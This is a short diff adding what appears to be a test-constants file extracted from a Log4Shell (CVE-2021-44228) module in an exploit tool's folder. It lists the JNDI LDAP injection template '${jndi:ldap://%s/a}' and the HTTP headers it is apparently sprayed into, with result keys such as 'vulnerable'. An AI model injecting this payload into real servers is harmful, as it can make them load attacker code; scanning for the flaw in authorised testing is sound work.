@@ -1,0 +1,4 @@
+# file: C:\Users\E-YAZILIM\Desktop\drakben\drakbendosyalar\modules\dynamic_exploits\CVE-2021-44228.py
+# hypothesis_version: 6.151.6
+
+['${jndi:ldap://%s/a}', 'Accept-Language', 'Authorization', 'CVE-2021-44228', 'Referer', 'User-Agent', 'X-Api-Version', 'X-Forwarded-For', 'cve', 'errors', 'payloads_sent', 'triggered_headers', 'vulnerable']
